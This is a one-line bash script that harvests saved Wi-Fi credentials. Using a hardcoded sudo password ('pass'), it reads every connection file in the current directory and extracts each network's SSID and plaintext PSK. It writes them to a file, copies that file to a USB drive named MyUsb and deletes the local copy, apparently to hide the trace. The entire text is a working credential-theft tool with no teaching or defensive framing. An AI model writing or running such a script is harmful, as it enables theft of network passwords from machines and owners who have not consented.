#!/bin/bash
echo -e "Wireless_Network_Name Password\n--------------------- --------" > ~/Desktop/wifi_pass.txt ; for FILE in *; do echo -e "$(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=psk=).*')"; done >> ~/Desktop/wifi_pass.txt; cp ~/Desktop/wifi_pass.txt /media/$(hostname)/MyUsb/; rm ~/Desktop/wifi_pass.txt
